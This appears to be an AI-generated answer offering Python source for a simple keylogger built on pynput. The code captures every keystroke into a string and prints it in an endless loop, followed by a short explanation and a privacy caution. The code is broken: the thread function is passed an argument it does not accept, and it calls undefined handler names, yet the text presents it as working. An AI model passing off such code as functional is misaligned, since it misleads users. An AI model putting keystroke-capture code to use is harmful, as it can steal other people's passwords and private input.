#Here's an example of how to create a simple keyboard event listener (keylogger) using the pynput library in Python:

import threading
from pynput import keyboard

class KeyboardListener:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            print('alphanumeric key {0} pressed'.format(key.char))
            self.log += f'{key.char}'
        except AttributeError:
            if key == keyboard.Key.space:
                print('space key pressed')
                self.log += ' '
            elif key == keyboard.Key.enter:
                print('enter key pressed')
                self.log += '\n'
            else:
                print(f"{key} is not an alphanumeric character")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False

# Collect events until released
def collect_events():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Create a KeyboardListener instance and start the event collection thread
    listener = KeyboardListener()
    keyboard_thread = threading.Thread(target=collect_events, args=(listener,))
    keyboard_thread.start()

    while True:
        print(f"You typed: {listener.log}")

#This program uses the pynput library to listen for keyboard events. When a key is pressed or released, it prints out information about the event and appends it to a string variable in the KeyboardListener class instance. The main thread continuously prints this string variable to simulate a simple "typed text" display.

#Please note that running such a program may raise privacy concerns since it can capture all typed keys, including passwords or other sensitive information. Always ensure you have appropriate permissions and are using this tool responsibly!
